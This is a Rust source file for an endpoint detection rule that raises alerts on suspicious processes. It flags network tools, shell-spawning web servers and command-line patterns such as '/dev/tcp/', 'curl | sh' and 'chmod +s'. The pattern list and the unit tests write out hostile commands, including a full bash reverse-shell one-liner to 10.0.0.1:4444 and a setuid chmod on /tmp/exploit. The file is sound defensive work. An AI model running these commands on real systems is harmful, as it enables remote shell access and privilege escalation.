use crate::events::{EventType, NormalizedEvent, Severity};
use super::super::Alert;
use super::traits::Rule;

/// Suspicious interpreters, reverse shells, and known-bad parent-child relationships.
/// MITRE ATT&CK: T1059 (Command and Scripting Interpreter), T1059.004 (Unix Shell)
pub struct SuspiciousProcessRule {
    suspicious_interpreters: Vec<&'static str>,
    suspicious_cmdline_patterns: Vec<&'static str>,
}

impl Default for SuspiciousProcessRule {
    fn default() -> Self {
        Self::new()
    }
}

impl SuspiciousProcessRule {
    pub fn new() -> Self {
        Self {
            suspicious_interpreters: vec![
                "nc", "ncat", "netcat", "socat",
                "nmap", "masscan",
                "curl", "wget",
                "python", "python3", "perl", "ruby", "php",
            ],
            suspicious_cmdline_patterns: vec![
                "/dev/tcp/",
                "bash -i",
                "sh -i",
                "mkfifo",
                "base64 -d",
                "base64 --decode",
                "/bin/sh -c",
                "exec 5<>/dev/tcp",
                "curl | sh",
                "curl | bash",
                "wget -O - |",
                "chmod +s",
                "chmod u+s",
                "chmod 4",
            ],
        }
    }

    fn check_suspicious_interpreter(&self, exe: &str, name: &str) -> Option<&'static str> {
        let basename = exe.rsplit('/').next().unwrap_or(exe);
        self.suspicious_interpreters
            .iter()
            .find(|&&interp| basename == interp || name == interp)
            .copied()
    }

    fn check_suspicious_cmdline(&self, cmdline: &str) -> Option<&'static str> {
        let lower = cmdline.to_lowercase();
        self.suspicious_cmdline_patterns
            .iter()
            .find(|&&pattern| lower.contains(pattern))
            .copied()
    }

    fn check_suspicious_parent_child(&self, ppid: u32, name: &str, exe: &str) -> Option<String> {
        // web server spawning shell
        let web_servers = ["nginx", "apache2", "httpd", "node", "java"];
        let shells = ["bash", "sh", "dash", "zsh", "fish", "csh"];

        let parent_name = self.read_parent_name(ppid);
        if let Some(ref pname) = parent_name {
            let pbase = pname.rsplit('/').next().unwrap_or(pname);
            let cbase = exe.rsplit('/').next().unwrap_or(name);

            for &ws in &web_servers {
                if pbase == ws {
                    for &sh in &shells {
                        if cbase == sh {
                            return Some(format!("{ws} spawned {sh}"));
                        }
                    }
                }
            }
        }
        None
    }

    fn read_parent_name(&self, ppid: u32) -> Option<String> {
        std::fs::read_to_string(format!("/proc/{ppid}/comm"))
            .ok()
            .map(|s| s.trim().to_string())
    }
}

impl Rule for SuspiciousProcessRule {
    fn id(&self) -> &str { "R002-suspicious-process" }
    fn name(&self) -> &str { "Suspicious Process Execution" }

    fn evaluate(&mut self, event: &NormalizedEvent) -> Option<Alert> {
        if event.event_type != EventType::Process {
            return None;
        }
        let proc = event.process_context.as_ref()?;
        let exe = proc.exe.as_deref().unwrap_or("");
        let cmdline = proc.cmdline.as_deref().unwrap_or("");

        // Check suspicious command line patterns first (higher confidence)
        if let Some(pattern) = self.check_suspicious_cmdline(cmdline) {
            let severity = if pattern.contains("/dev/tcp")
                || pattern.contains("mkfifo")
                || pattern.contains("chmod +s")
                || pattern.contains("chmod 4")
            {
                Severity::High
            } else {
                Severity::Medium
            };

            return Some(
                Alert::from_rule(
                    event.event_id,
                    self.id(),
                    severity,
                    format!("Suspicious command: {}", proc.name),
                    format!(
                        "Process '{}' (PID {}) executed with suspicious pattern: '{pattern}'",
                        proc.name, proc.pid
                    ),
                    0.8,
                )
                .with_factor("pattern_match", 1.0, pattern)
                .with_factor("cmdline_length", cmdline.len() as f64, "command complexity indicator")
                .with_mitre("T1059.004"),
            );
        }

        // Check suspicious parent-child relationship
        if let Some(ppid) = proc.ppid
            && let Some(reason) = self.check_suspicious_parent_child(ppid, &proc.name, exe)
        {
            return Some(
                Alert::from_rule(
                    event.event_id,
                    self.id(),
                    Severity::High,
                    format!("Suspicious parent-child: {reason}"),
                    format!(
                        "Process '{}' (PID {}) has suspicious lineage: {reason}",
                        proc.name, proc.pid
                    ),
                    0.75,
                )
                .with_factor("parent_child", 1.0, &reason)
                .with_mitre("T1059"),
            );
        }

        // Check suspicious interpreter execution (lower priority)
        if let Some(interp) = self.check_suspicious_interpreter(exe, &proc.name) {
            // Only flag if the interpreter was spawned by something unusual
            // Just running python/curl alone is not suspicious enough to alert
            if proc.ppid.is_some_and(|p| p <= 2) {
                return None; // spawned by init/kthreadd — normal
            }

            // Only alert on network tools, not general interpreters
            let network_tools = ["nc", "ncat", "netcat", "socat", "nmap", "masscan"];
            if !network_tools.contains(&interp) {
                return None;
            }

            return Some(
                Alert::from_rule(
                    event.event_id,
                    self.id(),
                    Severity::Medium,
                    format!("Network tool executed: {interp}"),
                    format!(
                        "Network reconnaissance/tunneling tool '{}' (PID {}) was executed",
                        proc.name, proc.pid
                    ),
                    0.6,
                )
                .with_factor("tool_type", 1.0, "network tool")
                .with_mitre("T1059"),
            );
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::{OsType, ProcessContext};

    fn proc_event(name: &str, exe: &str, cmdline: &str, ppid: u32) -> NormalizedEvent {
        NormalizedEvent::new("ep".into(), OsType::Linux, EventType::Process, Severity::Info)
            .with_process(ProcessContext {
                pid: 1234,
                ppid: Some(ppid),
                name: name.into(),
                exe: Some(exe.into()),
                cmdline: Some(cmdline.into()),
                uid: Some(1000),
                username: None,
                start_time: None,
                children_pids: vec![],
            })
    }

    #[test]
    fn detects_reverse_shell_pattern() {
        let mut rule = SuspiciousProcessRule::new();
        let event = proc_event("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 100);
        let alert = rule.evaluate(&event).unwrap();
        assert_eq!(alert.severity, Severity::High);
        assert!(alert.mitre_techniques.contains(&"T1059.004".to_string()));
    }

    #[test]
    fn detects_suid_bit_setting() {
        let mut rule = SuspiciousProcessRule::new();
        let event = proc_event("chmod", "/usr/bin/chmod", "chmod +s /tmp/exploit", 100);
        let alert = rule.evaluate(&event).unwrap();
        assert_eq!(alert.severity, Severity::High);
    }

    #[test]
    fn detects_network_tool() {
        let mut rule = SuspiciousProcessRule::new();
        let event = proc_event("nmap", "/usr/bin/nmap", "nmap -sS 192.168.1.0/24", 100);
        let alert = rule.evaluate(&event).unwrap();
        assert!(alert.title.contains("nmap"));
    }

    #[test]
    fn ignores_normal_process() {
        let mut rule = SuspiciousProcessRule::new();
        let event = proc_event("ls", "/usr/bin/ls", "ls -la /home", 100);
        assert!(rule.evaluate(&event).is_none());
    }

    #[test]
    fn ignores_non_process_events() {
        let mut rule = SuspiciousProcessRule::new();
        let event = NormalizedEvent::new("ep".into(), OsType::Linux, EventType::File, Severity::Info);
        assert!(rule.evaluate(&event).is_none());
    }
}
